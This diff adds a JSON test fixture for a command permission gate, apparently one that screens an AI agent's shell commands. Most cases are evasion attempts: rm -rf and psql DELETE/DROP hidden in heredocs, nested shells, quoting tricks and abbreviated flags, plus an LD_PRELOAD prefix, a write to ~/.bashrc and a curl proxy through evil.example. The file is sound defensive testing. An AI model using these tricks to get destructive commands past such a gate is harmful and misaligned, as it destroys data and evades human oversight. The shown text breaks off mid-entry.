@@ -1,0 +1,593 @@
+[
+ {
+  "B": 1,
+  "Name": "R1 newline after sanctioned api-test -> deny",
+  "Cmd": "docker compose -p agent-teams --profile test run --rm api-test pytest -q\ndocker compose exec api pytest -q",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 bind allow cannot carry curl -XDELETE -> ask",
+  "Cmd": "curl -XDELETE http://localhost:8456/api/projects/by-name/../../tasks/5",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 6000x ${ then psql DELETE -> ask (nested unclosed ${ past depth 3)",
+  "Cmd": "echo ${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${${; psql -c \"DELETE FROM tasks\"",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 exec python -m py\"\"test -> deny",
+  "Cmd": "docker compose exec -T api python -m py\"\"test -q",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 exec py.test -> deny",
+  "Cmd": "docker compose exec -T api py.test -q",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 docker -l debug exec pytest -> deny",
+  "Cmd": "docker -l debug exec api pytest -q",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 psql second -c DELETE -> deny",
+  "Cmd": "psql -c \"SELECT 1\" -c \"DELETE FROM tasks\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 psql -c\"DELETE\" glued -> deny",
+  "Cmd": "psql -c\"DELETE FROM tasks\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 psql --command= -> deny",
+  "Cmd": "psql --command=\"DELETE FROM tasks\" x",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 echo DML | psql -> deny",
+  "Cmd": "echo \"DELETE FROM tasks\" | psql -d x",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 cat heredoc | psql -> deny",
+  "Cmd": "cat <<EOF | psql -d x\nDELETE FROM tasks;\nEOF",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 python -Bc DML -> deny",
+  "Cmd": "python -Bc \"cur.execute('DELETE FROM tasks')\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 docker exec sh -c psql DELETE -> deny",
+  "Cmd": "docker exec db sh -c \"psql -U postgres -c 'DELETE FROM tasks'\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 bash -lc rm -rf -> ask",
+  "Cmd": "bash -lc \"rm -rf /home/x\"",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 powershell -Command Remove-Item -> ask",
+  "Cmd": "powershell -NoProfile -Command Remove-Item -Recurse -Force C:\\x",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 powershell positional script -> ask",
+  "Cmd": "powershell \"Remove-Item -Recurse C:\\x\"",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 4 nested bash -c -> ask",
+  "Cmd": "bash -c \"bash -c 'bash -c \\\"bash -c ls\\\"'\"",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 bash heredoc rm -rf -> ask",
+  "Cmd": "bash <<EOF\nrm -rf /home/x\nEOF",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 bash <<< rm -rf -> ask",
+  "Cmd": "bash <<< \"rm -rf /home/x\"",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 echo | bash -> ask",
+  "Cmd": "echo \"rm -rf /home/x\" | bash",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 $(( 1 << 2 )) then rm -rf -> ask",
+  "Cmd": "echo $(( 1 << 2 ))\nrm -rf /home/x",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 unquoted heredoc $(rm -rf) -> ask",
+  "Cmd": "cat <<EOF\n$(rm -rf src)\nEOF",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 quoted hyphen heredoc body is text -> allow",
+  "Cmd": "cat > _scratch/n.md <<'END-X'\nrm -rf src\nEND-X",
+  "Expected": "allow"
+ },
+ {
+  "B": 1,
+  "T": "PowerShell",
+  "Name": "R1 PS irm -Headers @{} -Method Delete -> ask",
+  "Cmd": "Invoke-RestMethod -Uri http://localhost:8456/api/tasks/5 -Headers @{ 'X-Project-Id' = '1' } -Method Delete",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "T": "PowerShell",
+  "Name": "R1 PS Remove-Item (Join-Path) -Recurse -> ask",
+  "Cmd": "Remove-Item (Join-Path $root 'src') -Recurse -Force",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "T": "PowerShell",
+  "Name": "R1 PS Remove-Item _scratch -ErrorAction -> none",
+  "Cmd": "Remove-Item _scratch\\x -Recurse -Force -ErrorAction SilentlyContinue",
+  "Expected": "none"
+ },
+ {
+  "B": 1,
+  "Name": "R1 python -m pytest -c ini -> allow",
+  "Cmd": "python -m pytest -c api/pytest.ini -q",
+  "Expected": "allow"
+ },
+ {
+  "B": 1,
+  "Name": "R1 git clean -nfd dry run -> allow",
+  "Cmd": "git clean -nfd",
+  "Expected": "allow"
+ },
+ {
+  "B": 1,
+  "Name": "R1 if git reset --hard -> ask",
+  "Cmd": "if git reset --hard; then echo ok; fi",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 bash vars are case-sensitive -> ask",
+  "Cmd": "S=/home; s=_scratch; rm -rf $S",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 export reassign forgets var -> ask",
+  "Cmd": "S=_scratch; export S=/home/x; rm -rf $S",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 unclosed quote re-segments the rest -> deny",
+  "Cmd": "echo \"abc; psql -c 'DELETE FROM tasks'",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R1 nested quotes in $( ) inside dq -> allow",
+  "Cmd": "printf \"%s\\n\" \"$(grep -o 'x' \"$TEMP/f.html\" | wc -l)\"",
+  "Expected": "allow"
+ },
+ {
+  "B": 1,
+  "Name": "R1 Windows path ending in backslash-quote -> allow",
+  "Cmd": "ls \"C:\\Users\\x\\web\\scripts\\\"",
+  "Expected": "allow"
+ },
+ {
+  "B": 1,
+  "T": "PowerShell",
+  "Name": "R1 PS $x += 1 -> none",
+  "Cmd": "$x = 1; $x += 1",
+  "Expected": "none"
+ },
+ {
+  "B": 1,
+  "Name": "R2 python -X utf8 -c pytest -> deny",
+  "Cmd": "python -X utf8 -c \"import pytest; pytest.main()\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R2 python -W ignore -c DML -> deny",
+  "Cmd": "python -W ignore -c \"x='DELETE FROM t'\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R2 commit msg heredoc with apostrophe and a) -> allow",
+  "Cmd": "git commit -m \"$(cat <<'EOF'\n#3500: gate fixes\n\n- don't ask on x (see #1)\n- a) first b) second\nEOF\n)\"",
+  "Expected": "allow"
+ },
+ {
+  "B": 1,
+  "T": "PowerShell",
+  "Name": "R2 PS here-string with apostrophe -> none",
+  "Cmd": "git commit -m @'\nDon't break the gate\n'@",
+  "Expected": "none"
+ },
+ {
+  "B": 1,
+  "Name": "R2 nested quotes in $( ) hide rm -> ask",
+  "Cmd": "echo \"$(cd \"/home/u\" && rm -rf \"foo\")\"",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "T": "PowerShell",
+  "Name": "R2 PS nested quotes in $( ) hide Remove-Item -> ask",
+  "Cmd": "Write-Output \"$(Remove-Item \"C:\\x\" -Recurse)\"",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2 bash -ce rm -rf -> ask",
+  "Cmd": "bash -ce \"rm -rf /x\"",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2 S+=/.. forgets the var -> ask",
+  "Cmd": "S=_scratch; S+=/..; rm -rf $S",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2 echo DML | psql -hlocalhost -> deny",
+  "Cmd": "echo \"DELETE FROM t\" | psql -hlocalhost -U postgres",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R2 UPDATE schema.table SET -> deny",
+  "Cmd": "psql -c \"UPDATE public.tasks SET x=1\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R2 DELETE/**/FROM -> deny",
+  "Cmd": "psql -c \"DELETE/**/FROM t\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 0,
+  "Name": "R2 unbound bind curl -sd body -> ask",
+  "Cmd": "curl -sd '{\"name\":\"x\"}' http://localhost:8456/api/projects?status=active",
+  "Expected": "ask"
+ },
+ {
+  "B": 0,
+  "Name": "R2 unbound bind curl -o outside _scratch -> ask",
+  "Cmd": "curl --silent \"http://localhost:8456/api/projects/by-name/agent-teams\" -o _runtime/foo.txt",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2 quoted paren inside $( ) inside dq -> allow",
+  "Cmd": "sed -i 's/\"Bash(docker compose /\"Bash(docker compose -p agent-teams /g' x.json && echo \"total: $(grep -c '\"Bash(docker compose' x.json)\" && echo \"bare: $(grep '\"Bash(docker compose [^-]' x.json | wc -l)\"",
+  "Expected": "allow"
+ },
+ {
+  "B": 1,
+  "Name": "R2s heredoc delimiter E\"O\"F hides rm -> ask",
+  "Cmd": "cat <<E\"O\"F\nx\nEOF\nrm -rf /home/x\nE",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2s heredoc delimiter E\\OF hides rm -> ask",
+  "Cmd": "cat <<E\\OF\nx\nEOF\nrm -rf /home/x\nE\\OF",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2s backslash-newline r\\m -> ask",
+  "Cmd": "r\\\nm -rf /home/x",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2s rm --rec -> ask",
+  "Cmd": "rm --rec /d",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2s git reset --har -> ask",
+  "Cmd": "git reset --har",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2s git push --del -> ask",
+  "Cmd": "git push --del origin dev",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2s git clean --forc -d -> ask",
+  "Cmd": "git clean --forc -d",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2s git branch --dele --forc -> ask",
+  "Cmd": "git branch --dele --forc x",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R2s echo DML | psql -f - -> deny",
+  "Cmd": "echo \"DELETE FROM tasks\" | psql -f -",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R2s heredoc | psql -f - -> deny",
+  "Cmd": "cat <<EOF | psql -f -\nDELETE FROM tasks;\nEOF",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R2s UPDATE t AS x SET -> deny",
+  "Cmd": "psql -c \"UPDATE tasks AS t SET a=1\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R2s DROP TRIGGER -> deny",
+  "Cmd": "psql -c \"DROP TRIGGER tasks_audit ON tasks\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R2s exec sh -c p\"\"ytest -> deny",
+  "Cmd": "docker compose exec -T api sh -c 'p\"\"ytest -q'",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R2s run api sh -c py\"\"test -> deny",
+  "Cmd": "docker compose run --rm api sh -c 'py\"\"test -q'",
+  "Expected": "deny"
+ },
+ {
+  "B": 0,
+  "Name": "R2s unbound bind curl --resolve -> ask",
+  "Cmd": "curl --resolve localhost:8456:1.2.3.4 http://localhost:8456/api/projects/by-name/x",
+  "Expected": "ask"
+ },
+ {
+  "B": 0,
+  "Name": "R2s unbound bind curl VAR= prefix -> ask",
+  "Cmd": "LD_PRELOAD=/tmp/x.so curl http://localhost:8456/api/projects/by-name/x",
+  "Expected": "ask"
+ },
+ {
+  "B": 0,
+  "Name": "R2s unbound bind curl -o ~/.bashrc -> ask",
+  "Cmd": "curl -o ~/.bashrc http://localhost:8456/api/projects/by-name/x",
+  "Expected": "ask"
+ },
+ {
+  "B": 0,
+  "Name": "R2s unbound bind curl -x proxy -> ask",
+  "Cmd": "curl -x evil.example:8080 http://localhost:8456/api/projects/by-name/x",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R3 comment ending in backslash does not hide next line -> ask",
+  "Cmd": "echo hi # note\\\nrm -rf /home/x",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R3 escaped backslash then newline -> ask",
+  "Cmd": "echo hi \\\\\nrm -rf /home/x",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R3 quoted heredoc body line ending in backslash -> ask",
+  "Cmd": "cat <<'EOF'\nx\\\nEOF\nrm -rf /home/x\nEOF",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "T": "PowerShell",
+  "Name": "R3 PS comment ending in backtick -> ask",
+  "Cmd": "Write-Output hi # note`\nRemove-Item -Recurse C:\\x",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R3 /**/ x26 ReDoS then DELETE -> deny",
+  "Cmd": "psql -c \"DELETE /**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**/x; DELETE FROM tasks\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R3 Out-File LocalAppData Temp x170 then reset -> ask or deny",
+  "Cmd": "echo Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData 